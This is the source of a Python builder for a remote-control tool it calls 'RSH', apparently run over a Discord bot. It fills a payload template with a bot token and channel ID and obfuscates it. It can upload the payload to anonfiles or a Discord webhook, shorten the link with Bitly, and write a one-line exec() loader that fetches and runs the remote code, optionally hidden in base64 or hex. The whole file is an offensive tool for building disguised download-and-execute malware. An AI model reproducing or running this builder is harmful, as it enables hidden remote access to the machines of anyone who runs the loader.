
from pyperion import obfuscate
from pystyle import Colorate, Colors, Write
from requests import post, get
from os import remove, mkdir, get_terminal_size
from base64 import b64encode
from os.path import exists

for dir in ["tmp", "build"]: mkdir(dir) if not exists(dir) else None

def sinput(string):
    return Write.Input(
        text=string,
        color=Colors.red_to_purple, 
        interval=0.015,
        hide_cursor=False,
        input_color=Colors.light_gray
    )

def choice_input(string, answers=["y", "n"]):
    answer = sinput(f"{string} ({'/'.join(answers)}) > ").lower()
    while answer not in [ans.lower() for ans in answers]: answer = sinput(f"{string} ({'/'.join(answers)}) > ").lower()
    if answers == ["y", "n"]: answer = {"y": True, "n": False}[answer]
    return answer

def display_title():

    terminal_size = get_terminal_size().columns

    pic = open("src/ascii_pic.txt", "r", encoding="UTF-8").read()
    title = open("src/ascii_title.txt", "r", encoding="UTF-8").read()

    pic_lines = pic.splitlines()
    title_lines = title.splitlines()

    spaces = " " * (terminal_size - (max([len(line) for line in pic_lines]) + max([len(line) for line in title_lines]) + 8))

    output = "\n\n"+"\n".join(["    "+title_lines[i]+spaces+pic_lines[i]+"    " for i in range(len(pic_lines))])+"\n\n\n\n"

    return Colorate.Vertical(Colors.red_to_black, output, 2)


def build():

    rsh = open("src/rsh.txt", "r").read()
    rsh = rsh.replace("__token__", token).replace("__channel_id__", channel_id)

    if is_hosted:


        open("tmp/rsh.py", "w").write(obfuscate(rsh))

        files = {
            'file': open('tmp/rsh.py', 'rb'),
        }

        if service == "anonfiles":
            resp = post('https://api.anonfiles.com/upload', files=files)

            json = resp.json()

            anonfile_url = json["data"]["file"]["url"]["full"]

            page = get(anonfile_url).text

            start = page.find("https://cdn-") + len("https://cdn-")
            end = page.find("/rsh.py")
            file_url = "https://cdn-"+page[start:end]+"/rsh.py"

        if service == "discord webhook":

            resp = post(webhook_url, files=files)

            json = resp.json()

            file_url = f"https://cdn.discordapp.com/attachments/{json['channel_id']}/{json['attachments'][0]['id']}/rsh.py"

        if is_shorted:

            headers = {
                "authorization": f"Bearer {bitly_key}"
            }

            json = {
                "long_url": file_url,
            }

            url = "https://api-ssl.bitly.com/v4/shorten"

            resp = post(url, json=json, headers=headers)

            file_url = resp.json().get("link")

        if module == "requests":
            content = f"exec(__import__('requests').get('{file_url}').text)"

        if module == "urllib":
            content = f"exec(__import__('urllib.request').request.urlopen('{file_url}').read().decode())"

        if encoding == "base64":
            encoded_output = b64encode(content.encode()).decode()
            content = f"exec(__import__('base64').b64decode('{encoded_output}'))"

        if encoding == "hexadecimal":
            encoded_output = "".join([hex(ord(character)).replace("0x","\\x") for character in content])
            content = f"exec('{encoded_output}')"

    else:
        content = obfuscate(rsh)

    open("build/built.py", "w").write(content)

def main():

    print(display_title())

    global token
    global channel_id
    global is_hosted

    token = sinput("Enter the token of the bot > ")
    channel_id = sinput("Enter the channel ID > ")
    is_hosted = choice_input("Do you want to host RSH")

    if is_hosted:

        global service
        service = choice_input("What service do you want to use", ["Discord Webhook","Anonfiles"])

        if service == "discord webhook":
            global webhook_url
            webhook_url = sinput("Discord Webhook URL > ")

        global is_shorted
        is_shorted = choice_input("Do you want to short you'r link with Bitly")

        if is_shorted:
            global bitly_key
            bitly_key = sinput("Enter you'r Bitly API key > ")

        global module
        module = choice_input("What module do you want to use", ["requests", "urllib"])

        global is_encoded
        is_encoded = choice_input("Do you want to encode your output")

        if is_encoded:
            global encoding
            encoding = choice_input("What encoding do you want to use", ["base64", "hexadecimal"])

    build()
    sinput("done!")




if __name__ == "__main__": main()
